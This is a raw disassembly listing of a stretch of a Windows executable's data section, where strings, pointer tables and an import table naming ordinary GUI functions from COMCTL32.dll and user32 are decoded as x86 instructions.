  428109:	ins    BYTE PTR es:[edi],dx
  42810a:	add    BYTE PTR [ebx+0x0],dh
  42810d:	popa   
  42810e:	add    BYTE PTR [ebx+0x0],dh
  428111:	jo     0x428113
  428113:	popa   
  428114:	add    BYTE PTR [ecx+0x0],ch
  428117:	imul   eax,DWORD PTR [eax],0x72
  42811a:	add    BYTE PTR [ebp+0x0],ah
  42811d:	jbe    0x42811f
  42811f:	add    BYTE PTR [eax],al
  428121:	jb     0x428123
  428123:	jne    0x428125
  428125:	je     0x428127
  428127:	ins    DWORD PTR es:[edi],dx
  428128:	add    BYTE PTR [ebp+0x0],dh
  42812b:	arpl   WORD PTR [eax],ax
  42812d:	jne    0x42812f
  42812f:	jo     0x428131
  428131:	add    BYTE PTR [eax],al
  428133:	jae    0x428135
  428135:	outs   dx,DWORD PTR ds:[esi]
  428136:	add    BYTE PTR [esi+0x0],ah
  428139:	imul   eax,DWORD PTR [eax],0x630062
  42813f:	outs   dx,DWORD PTR ds:[esi]
  428140:	add    BYTE PTR [ecx+0x0],ch
  428143:	jb     0x428145
  428145:	jae    0x428147
  428147:	outs   dx,DWORD PTR ds:[esi]
  428148:	add    BYTE PTR [eax],al
  42814a:	add    BYTE PTR [ebx+0x0],dl
  42814d:	outs   dx,DWORD PTR ds:[esi]
  42814e:	add    BYTE PTR [ebx+0x0],ah
  428151:	popa   
  428152:	add    BYTE PTR [ecx+0x0],ch
  428155:	jae    0x428157
  428157:	data16 add BYTE PTR [ecx+0x0],ah
  42815b:	jb     0x42815d
  42815d:	popa   
  42815e:	add    BYTE PTR [ecx+0x0],ch
  428161:	add    BYTE PTR [eax],al
  428163:	add    BYTE PTR [esi],cl
  428165:	adc    BYTE PTR [eax],al
  428167:	out    0x67,eax
  428169:	adc    BYTE PTR [eax],al
  42816b:	js     0x428194
  42816d:	adc    BYTE PTR [eax],al
  42816f:	test   al,0x13
  428171:	adc    BYTE PTR [eax],al
  428173:	fs push esi
  428175:	adc    BYTE PTR [eax],al
  428177:	jp     0x428199
  428179:	adc    BYTE PTR [eax],al
  42817b:	enter  0x1052,0x0
  42817f:	loop   0x4281f4
  428181:	adc    BYTE PTR [eax],al
  428183:	ja     0x4281f0
  428185:	adc    BYTE PTR [eax],al
  428187:	cmp    al,0x2b
  428189:	adc    BYTE PTR [eax],al
  42818b:	rcl    BYTE PTR [edx],1
  42818d:	adc    BYTE PTR [eax],al
  42818f:	sbb    DWORD PTR [eax+0x10],ebx
  428192:	add    BYTE PTR [esi],ah
  428194:	add    dl,BYTE PTR [eax]
  428196:	add    BYTE PTR [edi+0xc],dh
  428199:	adc    BYTE PTR [eax],al
  42819b:	mov    dh,BYTE PTR [ecx]
  42819d:	adc    BYTE PTR [eax],al
  42819f:	out    dx,al
  4281a0:	sbb    eax,0xed80010
  4281a5:	adc    BYTE PTR [eax],al
  4281a7:	add    eax,0x3300107f
  4281ac:	jbe    0x4281be
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [edi-0x7f],bh
  4281cd:	inc    edx
  4281ce:	add    BYTE PTR [ebx-0x78ffbd7f],al
  4281d4:	add    DWORD PTR [edx+0x0],0x42818b
  4281db:	pop    DWORD PTR [ecx-0x7e6cffbe]
  4281e1:	inc    edx
  4281e2:	add    BYTE PTR [edi-0x64ffbd7f],dl
  4281e8:	add    DWORD PTR [edx+0x0],0x42819f
  4281ef:	mov    ds:0xa7004281,eax
  4281f4:	add    DWORD PTR [edx+0x0],0x4281ab
  4281fb:	cmp    eax,DWORD PTR [edx-0x7dc0ffbe]
  428201:	inc    edx
  428202:	add    BYTE PTR [ebx-0x7e],al
  428205:	inc    edx
  428206:	add    BYTE PTR [edi-0x7e],al
  428209:	inc    edx
  42820a:	add    BYTE PTR [ebx-0x7e],cl
  42820d:	inc    edx
  42820e:	add    BYTE PTR [edi-0x7e],cl
  428211:	inc    edx
  428212:	add    BYTE PTR [ebx-0x7e],dl
  428215:	inc    edx
  428216:	add    BYTE PTR [edi-0x7e],dl
  428219:	inc    edx
  42821a:	add    BYTE PTR [ebx-0x7e],bl
  42821d:	inc    edx
  42821e:	add    BYTE PTR [edi-0x7e],bl
  428221:	inc    edx
  428222:	add    BYTE PTR [ebx-0x7e],ah
  428225:	inc    edx
  428226:	add    BYTE PTR [edi-0x7e],ah
  428229:	inc    edx
  42822a:	add    BYTE PTR [ebx-0x7e],ch
  42822d:	inc    edx
  42822e:	add    BYTE PTR [edi-0x7e],ch
  428231:	inc    edx
  428232:	add    BYTE PTR [ebx-0x7e],dh
  428235:	inc    edx
  428236:	add    BYTE PTR [edi-0x7e],dh
  428239:	inc    edx
  42823a:	add    BYTE PTR [ecx],ch
  42823c:	or     al,0x10
  42823e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428244:	push   edi
  428245:	adc    BYTE PTR [eax],al
  428247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428248:	outs   dx,DWORD PTR ds:[esi]
  428249:	adc    BYTE PTR [eax],al
  42824b:	push   ebx
  42824c:	popa   
  42824d:	adc    BYTE PTR [eax],al
  42824f:	add    dh,BYTE PTR [ebp+0x10]
  428252:	add    dh,cl
  428254:	jle    0x428266
  428256:	add    BYTE PTR [esi+edx*2],dl
  428259:	adc    BYTE PTR [eax],al
  42825b:	mov    al,0x68
  42825d:	adc    BYTE PTR [eax],al
  42825f:	aas    
  428260:	inc    esp
  428261:	adc    BYTE PTR [eax],al
  428263:	pop    ebp
  428264:	and    DWORD PTR [eax],edx
  428266:	add    bl,dl
  428268:	jl     0x42827a
  42826a:	add    BYTE PTR [edx+0xb],dh
  42826d:	adc    BYTE PTR [eax],al
  42826f:	inc    edx
  428270:	push   eax
  428271:	adc    BYTE PTR [eax],al
  428273:	mov    ebp,0xbb001074
  428278:	pop    ds
  428279:	adc    BYTE PTR [eax],al
  42827b:	sub    DWORD PTR [eax+0x10],eax
  42827e:	add    BYTE PTR [ecx],dh
  428280:	ja     0x428292
  428282:	add    bl,dl
  428284:	sbb    dl,BYTE PTR [eax]
  428286:	add    BYTE PTR [esi+0x1e],ch
  428289:	adc    BYTE PTR [eax],al
  42828b:	or     ch,BYTE PTR [esi]
  42828d:	adc    BYTE PTR [eax],al
  42828f:	sbb    eax,0xa100103e
  428294:	data16 adc BYTE PTR [eax],al
  428297:	xchg   ecx,eax
  428298:	bound  edx,QWORD PTR [eax]
  42829a:	add    BYTE PTR [esi],bh
  42829c:	dec    edi
  42829d:	adc    BYTE PTR [eax],al
  42829f:	in     eax,dx
  4282a0:	adc    BYTE PTR fs:[eax],al
  4282a3:	sub    bl,BYTE PTR [ecx+0x10]
  4282a6:	add    BYTE PTR [esi+0x43],al
  4282a9:	adc    BYTE PTR [eax],al
  4282ab:	imul   edi,DWORD PTR [eax+edx*1],0x0
  4282af:	rol    BYTE PTR [esi+0x10],0x0
  4282b3:	in     eax,0x31
  4282b5:	adc    BYTE PTR [eax],al
  4282b7:	mov    esp,0x7b00104f
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0x8b
  4282cc:	add    BYTE PTR [edx+0x0],0x8f
  4282d0:	add    BYTE PTR [edx+0x0],0x93
  4282d4:	add    BYTE PTR [edx+0x0],0x97
  4282d8:	add    BYTE PTR [edx+0x0],0x9b
  4282dc:	add    BYTE PTR [edx+0x0],0x9f
  4282e0:	add    BYTE PTR [edx+0x0],0xa3
  4282e4:	add    BYTE PTR [edx+0x0],0xa7
  4282e8:	add    BYTE PTR [edx+0x0],0xab
  4282ec:	add    BYTE PTR [edx+0x0],0xaf
  4282f0:	add    BYTE PTR [edx+0x0],0xb3
  4282f4:	add    BYTE PTR [edx+0x0],0xb7
  4282f8:	add    BYTE PTR [edx+0x0],0xe1
  4282fc:	and    dl,BYTE PTR [eax]
  4282fe:	add    bh,bh
  428300:	push   ecx
  428301:	adc    BYTE PTR [eax],al
  428303:	test   BYTE PTR ds:0x1d0c0010,0x10
  42830a:	add    BYTE PTR [ebx],al
  42830c:	sbb    dl,BYTE PTR [eax]
  42830e:	add    ch,ah
  428310:	or     dl,BYTE PTR [eax]
  428312:	add    BYTE PTR [edi+0x42001035],bl
  428318:	pop    edi
  428319:	adc    BYTE PTR [eax],al
  42831b:	adc    eax,0xd300103f
  428320:	cmp    dl,BYTE PTR [eax]
  428322:	add    BYTE PTR [ebp+0x1001021],ah
  428328:	sbb    al,0x10
  42832a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428330:	adc    BYTE PTR cs:[eax],al
  428333:	push   eax
  428334:	adc    BYTE PTR [bx+si],al
  428337:	mov    edi,0xfb00102d
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xb
  42834c:	add    DWORD PTR [edx+0x0],0xf
  428350:	add    DWORD PTR [edx+0x0],0x13
  428354:	add    DWORD PTR [edx+0x0],0x17
  428358:	add    DWORD PTR [edx+0x0],0x1b
  42835c:	add    DWORD PTR [edx+0x0],0x1f
  428360:	add    DWORD PTR [edx+0x0],0x23
  428364:	add    DWORD PTR [edx+0x0],0x27
  428368:	add    DWORD PTR [edx+0x0],0x2b
  42836c:	add    DWORD PTR [edx+0x0],0x2f
  428370:	add    DWORD PTR [edx+0x0],0x33
  428374:	add    DWORD PTR [edx+0x0],0x37
  428378:	add    DWORD PTR [edx+0x0],0xffffff98
  42837c:	pusha  
  42837d:	adc    BYTE PTR [eax],al
  42837f:	pop    ebp
  428380:	js     0x428392
  428382:	add    BYTE PTR [esi],bh
  428384:	dec    eax
  428385:	adc    BYTE PTR [eax],al
  428387:	cmp    al,0x7a
  428389:	adc    BYTE PTR [eax],al
  42838b:	aam    0x9
  42838d:	adc    BYTE PTR [eax],al
  42838f:	or     cl,BYTE PTR [ebx]
  428391:	adc    BYTE PTR [eax],al
  428393:	pop    ebx
  428394:	push   ebp
  428395:	adc    BYTE PTR [eax],al
  428397:	mov    esi,0x6001032
  42839c:	xor    edx,DWORD PTR [eax]
  42839e:	add    BYTE PTR [esi-0x16ffefc0],al
  4283a4:	and    eax,0x61460010
  4283a9:	adc    BYTE PTR [eax],al
  4283ab:	adc    DWORD PTR [ebp+0x10],ebp
  4283ae:	add    al,al
  4283b0:	dec    esi
  4283b1:	adc    BYTE PTR [eax],al
  4283b3:	jae    0x4283d3
  4283b5:	adc    BYTE PTR [eax],al
  4283b7:	dec    ebx
  4283b8:	add    eax,0x837b0010
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff8b
  4283cc:	add    DWORD PTR [edx+0x0],0xffffff8f
  4283d0:	add    DWORD PTR [edx+0x0],0xffffff93
  4283d4:	add    DWORD PTR [edx+0x0],0xffffff97
  4283d8:	add    DWORD PTR [edx+0x0],0xffffff9b
  4283dc:	add    DWORD PTR [edx+0x0],0xffffff9f
  4283e0:	add    DWORD PTR [edx+0x0],0xffffffa3
  4283e4:	add    DWORD PTR [edx+0x0],0xffffffa7
  4283e8:	add    DWORD PTR [edx+0x0],0xffffffab
  4283ec:	add    DWORD PTR [edx+0x0],0xffffffaf
  4283f0:	add    DWORD PTR [edx+0x0],0xffffffb3
  4283f4:	add    DWORD PTR [edx+0x0],0xffffffb7
  4283f8:	add    DWORD PTR [edx+0x0],0x0
	...
  428404:	cmp    dh,BYTE PTR [ecx+0x52]
  428407:	dec    edi
  428408:	add    BYTE PTR [eax],al
  42840a:	add    BYTE PTR [eax],al
  42840c:	pusha  
  42840d:	lea    eax,[edx]
  42840f:	add    BYTE PTR [ecx],al
  428411:	add    BYTE PTR [eax],al
  428413:	add    BYTE PTR [ecx],al
  428415:	add    BYTE PTR [eax],al
  428417:	add    BYTE PTR [ecx],al
  428419:	add    BYTE PTR [eax],al
  42841b:	add    BYTE PTR [eax],dh
  42841d:	lea    eax,[edx]
  42841f:	add    BYTE PTR [eax-0x73],dl
  428422:	add    al,BYTE PTR [eax]
  428424:	inc    eax
  428425:	lea    eax,[edx]
	...
  428433:	add    al,bh
  428435:	test   DWORD PTR [edx],eax
  428437:	add    BYTE PTR [esi+eax*4],dl
  42843a:	add    al,BYTE PTR [eax]
  42843c:	xchg   BYTE PTR es:[edx],al
  42843f:	add    BYTE PTR [eax],bh
  428441:	xchg   BYTE PTR [edx],al
  428443:	add    BYTE PTR [eax-0x7a],dl
  428446:	add    al,BYTE PTR [eax]
  428448:	xchg   BYTE PTR fs:[edx],al
  42844b:	add    BYTE PTR [esi-0x7a],bh
  42844e:	add    al,BYTE PTR [eax]
  428450:	add    BYTE PTR [eax],al
  428452:	add    BYTE PTR [eax],al
  428454:	mov    al,ds:0xbe000286
  428459:	xchg   BYTE PTR [edx],al
  42845b:	add    ah,cl
  42845d:	xchg   BYTE PTR [edx],al
  42845f:	add    dl,bl
  428461:	xchg   BYTE PTR [edx],al
  428463:	add    dh,ch
  428465:	xchg   BYTE PTR [edx],al
  428467:	add    ah,bh
  428469:	xchg   BYTE PTR [edx],al
  42846b:	add    BYTE PTR [esi],cl
  42846d:	xchg   DWORD PTR [edx],eax
  42846f:	add    BYTE PTR [eax],ah
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    BYTE PTR [esi],ch
  428475:	xchg   DWORD PTR [edx],eax
  428477:	add    BYTE PTR [eax-0x79],al
  42847a:	add    al,BYTE PTR [eax]
  42847c:	push   edx
  42847d:	xchg   DWORD PTR [edx],eax
  42847f:	add    BYTE PTR [eax-0x79],ah
  428482:	add    al,BYTE PTR [eax]
  428484:	outs   dx,BYTE PTR ds:[esi]
  428485:	xchg   DWORD PTR [edx],eax
  428487:	add    BYTE PTR [eax-0x73fffd79],al
  42848d:	xchg   DWORD PTR [edx],eax
  42848f:	add    BYTE PTR [edx-0x4bfffd79],ah
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    dh,al
  428499:	xchg   DWORD PTR [edx],eax
  42849b:	add    dl,dl
  42849d:	xchg   DWORD PTR [edx],eax
  42849f:	add    dl,ah
  4284a1:	xchg   DWORD PTR [edx],eax
  4284a3:	add    dl,dh
  4284a5:	xchg   DWORD PTR [edx],eax
  4284a7:	add    BYTE PTR [eax],cl
  4284a9:	mov    BYTE PTR [edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4],dl
  4284ae:	add    al,BYTE PTR [eax]
  4284b0:	mov    BYTE PTR es:[edx],al
  4284b3:	add    BYTE PTR [eax+ecx*4],bh
  4284b6:	add    al,BYTE PTR [eax]
  4284b8:	dec    esi
  4284b9:	mov    BYTE PTR [edx],al
  4284bb:	add    BYTE PTR [eax+ecx*4+0x2],bl
  4284bf:	add    BYTE PTR [eax+ecx*4+0x2],ch
  4284c3:	add    BYTE PTR [esi-0x78],bh
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	xchg   edx,eax
  4284c9:	mov    BYTE PTR [edx],al
  4284cb:	add    BYTE PTR [eax-0x45fffd78],ch
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    ah,cl
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    ah,bl
  4284d9:	mov    BYTE PTR [edx],al
  4284db:	add    ah,ch
  4284dd:	mov    BYTE PTR [edx],al
  4284df:	add    ah,bh
  4284e1:	mov    BYTE PTR [edx],al
  4284e3:	add    BYTE PTR [esi],cl
  4284e5:	mov    DWORD PTR [edx],eax
  4284e7:	add    BYTE PTR [ecx+ecx*4],bl
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	sub    cl,BYTE PTR [ecx-0x76bdfffe]
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	push   esp
  4284f5:	mov    DWORD PTR [edx],eax
  4284f7:	add    BYTE PTR [esi-0x77],ah
  4284fa:	add    al,BYTE PTR [eax]
  4284fc:	jb     0x428487
  4284fe:	add    al,BYTE PTR [eax]
  428500:	jle    0x42848b
  428502:	add    al,BYTE PTR [eax]
  428504:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  42850a:	add    al,BYTE PTR [eax]
  42850c:	mov    al,0x89
  42850e:	add    al,BYTE PTR [eax]
  428510:	mov    esi,0xd0000289
  428515:	mov    DWORD PTR [edx],eax
  428517:	add    dl,ah
  428519:	mov    DWORD PTR [edx],eax
  42851b:	add    BYTE PTR [eax],al
  42851d:	add    BYTE PTR [eax],al
  42851f:	add    ah,bh
  428521:	mov    DWORD PTR [edx],eax
  428523:	add    BYTE PTR [eax],al
  428525:	add    BYTE PTR [eax],al
  428527:	add    BYTE PTR [edx],bl
  428529:	mov    al,BYTE PTR [edx]
  42852b:	add    BYTE PTR [edx+ecx*4],ch
  42852e:	add    al,BYTE PTR [eax]
  428530:	mov    al,BYTE PTR ds:[edx]
  428533:	add    BYTE PTR [edx+ecx*4+0x2],dl
  428537:	add    BYTE PTR [esi-0x76],ah
  42853a:	add    al,BYTE PTR [eax]
  42853c:	js     0x4284c8
  42853e:	add    al,BYTE PTR [eax]
  428540:	mov    BYTE PTR [edx-0x7559fffe],cl
  428546:	add    al,BYTE PTR [eax]
  428548:	mov    dh,0x8a
  42854a:	add    al,BYTE PTR [eax]
  42854c:	les    ecx,FWORD PTR [edx-0x752bfffe]
  428552:	add    al,BYTE PTR [eax]
  428554:	loop   0x4284e0
  428556:	add    al,BYTE PTR [eax]
  428558:	repnz mov al,BYTE PTR [edx]
  42855b:	add    dh,bh
  42855d:	mov    al,BYTE PTR [edx]
  42855f:	add    BYTE PTR [eax],dl
  428561:	mov    eax,DWORD PTR [edx]
  428563:	add    BYTE PTR [edx],ah
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    BYTE PTR [eax],bh
  428569:	mov    eax,DWORD PTR [edx]
  42856b:	add    BYTE PTR [esi-0x75],al
  42856e:	add    al,BYTE PTR [eax]
  428570:	push   edx
  428571:	mov    eax,DWORD PTR [edx]
  428573:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428577:	add    BYTE PTR [ebx+ecx*4-0x7463fffe],al
  42857e:	add    al,BYTE PTR [eax]
  428580:	stos   BYTE PTR es:[edi],al
  428581:	mov    eax,DWORD PTR [edx]
  428583:	add    BYTE PTR [esi-0x37fffd75],dh
  428589:	mov    eax,DWORD PTR [edx]
  42858b:	add    BYTE PTR [eax],al
  42858d:	add    BYTE PTR [eax],al
  42858f:	add    al,ch
  428591:	mov    eax,DWORD PTR [edx]
  428593:	add    dl,dh
  428595:	mov    eax,DWORD PTR [edx]
  428597:	add    BYTE PTR [eax],al
  428599:	mov    WORD PTR [edx],es
  42859b:	add    BYTE PTR [esp+ecx*4],cl
  42859e:	add    al,BYTE PTR [eax]
  4285a0:	sbb    al,0x8c
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	sub    cl,BYTE PTR [edx+eax*1+0x28c3600]
  4285ab:	add    BYTE PTR [eax-0x74],al
  4285ae:	add    al,BYTE PTR [eax]
  4285b0:	push   edx
  4285b1:	mov    WORD PTR [edx],es
  4285b3:	add    BYTE PTR [eax-0x74],ch
  4285b6:	add    al,BYTE PTR [eax]
  4285b8:	jle    0x428546
  4285ba:	add    al,BYTE PTR [eax]
  4285bc:	xchg   esp,eax
  4285bd:	mov    WORD PTR [edx],es
  4285bf:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  4285c6:	add    al,BYTE PTR [eax]
  4285c8:	les    ecx,FWORD PTR [edx+eax*1+0x28cd200]
  4285cf:	add    dl,ch
  4285d1:	mov    WORD PTR [edx],es
  4285d3:	add    ah,dh
  4285d5:	mov    WORD PTR [edx],es
  4285d7:	add    BYTE PTR [eax],al
  4285d9:	lea    eax,[edx]
  4285db:	add    BYTE PTR [esi],cl
  4285dd:	lea    eax,[edx]
	...
  4285ef:	add    BYTE PTR [ebx+0x6d],ah
  4285f2:	fs cs gs js 0x42865c
  4285f7:	add    BYTE PTR [edi],dl
  4285f9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285fd:	je     0x428671
  4285ff:	outs   dx,DWORD PTR ds:[esi]
  428600:	jns    0x428652
  428602:	jb     0x428673
  428604:	jo     0x42866b
  428606:	jb     0x42867c
  428608:	jns    0x42865d
  42860a:	push   0x50746565
  42860f:	popa   
  428610:	add    BYTE PTR gs:[bx+si],al
  428614:	pop    esp
  428615:	add    BYTE PTR [eax+0x72],dl
  428618:	outs   dx,DWORD PTR ds:[esi]
  428619:	jo     0x428680
  42861b:	jb     0x428691
  42861d:	jns    0x428672
  42861f:	push   0x57746565
  428624:	add    BYTE PTR [eax],al
  428626:	pop    ebx
  428627:	add    BYTE PTR [eax+0x72],dl
  42862a:	outs   dx,DWORD PTR ds:[esi]
  42862b:	jo     0x428692
  42862d:	jb     0x4286a3
  42862f:	jns    0x428684
  428631:	push   0x41746565
  428636:	add    BYTE PTR [eax],al
  428638:	dec    esi
  428639:	add    BYTE PTR [ecx+0x6d],cl
  42863c:	popa   
  42863d:	addr16 gs dec esp
  428640:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428647:	ins    BYTE PTR es:[edi],dx
  428648:	popa   
  428649:	arpl   WORD PTR [ebp+0x49],sp
  42864c:	arpl   WORD PTR [edi+0x6e],bp
  42864f:	add    BYTE PTR [ecx],dh
  428651:	add    BYTE PTR [ecx+0x6d],cl
  428654:	popa   
  428655:	addr16 gs dec esp
  428658:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42865f:	je     0x4286d3
  428661:	outs   dx,DWORD PTR ds:[esi]
  428662:	jns    0x428664
  428664:	inc    eax
  428665:	add    BYTE PTR [ecx+0x6d],cl
  428668:	popa   
  428669:	addr16 gs dec esp
  42866c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428673:	dec    ecx
  428674:	ins    DWORD PTR es:[edi],dx
  428675:	popa   
  428676:	addr16 gs inc ebx
  428679:	outs   dx,DWORD PTR ds:[esi]
  42867a:	jne    0x4286ea
  42867c:	je     0x42867e
  42867e:	dec    esp
  42867f:	add    BYTE PTR [ecx+0x6d],cl
  428682:	popa   
  428683:	addr16 gs dec esp
  428686:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42868d:	outs   dx,DWORD PTR ds:[esi]
  42868e:	jbe    0x4286f5
  428690:	add    BYTE PTR [eax],al
  428692:	inc    ebx
  428693:	dec    edi
  428694:	dec    ebp
  428695:	inc    ebx
  428696:	push   esp
  428697:	dec    esp
  428698:	xor    esi,DWORD PTR [edx]
  42869a:	cs fs ins BYTE PTR es:[edi],dx
  42869d:	ins    BYTE PTR es:[edi],dx
  42869e:	add    BYTE PTR [eax],al
  4286a0:	push   edi
  4286a1:	add    BYTE PTR [ebx+0x72],al
  4286a4:	gs popa 
  4286a6:	je     0x42870d
  4286a8:	inc    esp
  4286a9:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286b0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286b8:	jb     0x42871b
  4286ba:	ins    DWORD PTR es:[edi],dx
  4286bb:	push   edi
  4286bc:	add    BYTE PTR [eax],al
  4286be:	xor    al,BYTE PTR [edx]
  4286c0:	push   ebx
  4286c1:	gs je  0x428707
  4286c4:	popa   
  4286c5:	jb     0x42872c
  4286c7:	je     0x428719
  4286c9:	outs   dx,DWORD PTR ds:[esi]
  4286ca:	jae    0x4286cc
  4286cc:	cmp    al,BYTE PTR [ecx]
  4286ce:	inc    edi
  4286cf:	gs je  0x42871f
  4286d2:	gs jae 0x428748
  4286d5:	popa   
  4286d6:	addr16 gs inc ecx
  4286d9:	add    BYTE PTR [edx+0x61724400],dh
  4286df:	ja     0x428727
  4286e1:	jb     0x428744
  4286e3:	ins    DWORD PTR es:[edi],dx
  4286e4:	gs inc ebx
  4286e6:	outs   dx,DWORD PTR ds:[esi]
  4286e7:	outs   dx,BYTE PTR ds:[esi]
  4286e8:	je     0x42875c
  4286ea:	outs   dx,DWORD PTR ds:[esi]
  4286eb:	ins    BYTE PTR es:[edi],dx
  4286ec:	add    BYTE PTR [eax],al
  4286ee:	sbb    BYTE PTR [ecx],al
  4286f0:	inc    edi
  4286f1:	gs je  0x42873d
  4286f4:	arpl   WORD PTR [edi+0x6e],bp
  4286f7:	dec    ecx
  4286f8:	outs   dx,BYTE PTR ds:[esi]
  4286f9:	outs   dx,WORD PTR ds:[esi]
  4286fb:	add    bl,bh
  4286fd:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428701:	arpl   WORD PTR [ebx+0x50],bp
  428704:	outs   dx,DWORD PTR ds:[esi]
  428705:	jo     0x42877c
  428707:	jo     0x428756
  428709:	outs   dx,BYTE PTR gs:[esi]
  42870b:	jne    0x42870d
  42870d:	add    cl,bl
  42870f:	add    DWORD PTR [ebp+0x6f],ecx
  428712:	outs   dx,BYTE PTR ds:[esi]
  428713:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42871b:	push   edx
  42871c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428721:	add    BYTE PTR [ebx+0x68],al
  428724:	popa   
  428725:	jb     0x42877c
  428727:	jo     0x428799
  428729:	gs jb  0x428783
  42872c:	add    BYTE PTR [eax],al
  42872e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428732:	je     0x428778
  428734:	ins    BYTE PTR es:[edi],dx
  428735:	addr16 dec ecx
  428737:	je     0x42879e
  428739:	ins    DWORD PTR es:[edi],dx
  42873a:	push   esp
  42873b:	gs js  0x4287b2
  42873e:	inc    ecx
  42873f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428743:	push   0x774f776f
  428748:	outs   dx,BYTE PTR ds:[esi]
  428749:	gs fs push eax
  42874c:	outs   dx,DWORD PTR ds:[esi]
  42874d:	jo     0x4287c4
  42874f:	jo     0x4287c4
  428751:	add    BYTE PTR [eax],bl
  428753:	add    dl,BYTE PTR [edx+0x65]
  428756:	ins    DWORD PTR es:[edi],dx
  428757:	outs   dx,DWORD PTR ds:[esi]
  428758:	jbe    0x4287bf
  42875a:	push   eax
  42875b:	jb     0x4287cc
  42875d:	jo     0x4287b6
  42875f:	add    BYTE PTR [edi+0x2],bh
  428762:	push   ebx
  428763:	push   0x6957776f
  428768:	outs   dx,BYTE PTR ds:[esi]
  428769:	outs   dx,DWORD PTR fs:[esi]
  42876b:	ja     0x42876d
  42876d:	add    BYTE PTR [ebx],bl
  42876f:	add    BYTE PTR [ebx+0x61],al
  428772:	ins    BYTE PTR es:[edi],dx
  428773:	ins    BYTE PTR es:[edi],dx
  428774:	push   edi
  428775:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42877c:	outs   dx,DWORD PTR ds:[esi]
  42877d:	arpl   WORD PTR [edi+0x0],dx
  428780:	mov    dh,0x1
  428782:	dec    esp
  428783:	outs   dx,DWORD PTR ds:[esi]
  428784:	popa   
  428785:	fs dec ebp
  428787:	outs   dx,BYTE PTR gs:[esi]
  428789:	jne    0x4287cc
  42878b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428792:	arpl   WORD PTR [eax+0x54],bp
  428795:	outs   dx,DWORD PTR ds:[esi]
  428796:	push   esp
  428797:	push   0x69577369
  42879c:	outs   dx,BYTE PTR ds:[esi]
  42879d:	outs   dx,DWORD PTR fs:[esi]
  42879f:	ja     0x4287a1
  4287a1:	add    BYTE PTR [eax],ah
  4287a3:	add    dl,BYTE PTR [ebx+0x63]
  4287a6:	jb     0x428817
  4287a8:	ins    BYTE PTR es:[edi],dx
  4287a9:	ins    BYTE PTR es:[edi],dx
  4287aa:	push   edi
  4287ab:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287b2:	add    BYTE PTR [eax],al
  4287b4:	pop    DWORD PTR [eax]
  4287b6:	inc    esp
  4287b7:	gs push di
  4287ba:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287c1:	outs   dx,DWORD PTR ds:[esi]
  4287c2:	arpl   WORD PTR [edi+0x0],dx
  4287c5:	add    BYTE PTR [ecx],dh
  4287c7:	add    BYTE PTR [ebx+0x68],al
  4287ca:	popa   
  4287cb:	jb     0x42881d
  4287cd:	jb     0x428834
  4287cf:	jbe    0x428828
  4287d1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287d8:	fs popa 
  4287da:	je     0x428841
  4287dc:	push   edx
  4287dd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287e2:	xor    eax,DWORD PTR [ecx]
  4287e4:	inc    edi
  4287e5:	gs je  0x428835
  4287e8:	outs   dx,BYTE PTR gs:[esi]
  4287ea:	jne    0x428835
  4287ec:	je     0x428853
  4287ee:	ins    DWORD PTR es:[edi],dx
  4287ef:	dec    ecx
  4287f0:	inc    esp
  4287f1:	add    BYTE PTR ds:0x6e655302,ch
  4287f7:	fs dec esi
  4287f9:	outs   dx,DWORD PTR ds:[esi]
  4287fa:	je     0x428865
  4287fc:	data16 jns 0x42884c
  4287ff:	gs jae 0x428875
  428802:	popa   
  428803:	addr16 gs push edi
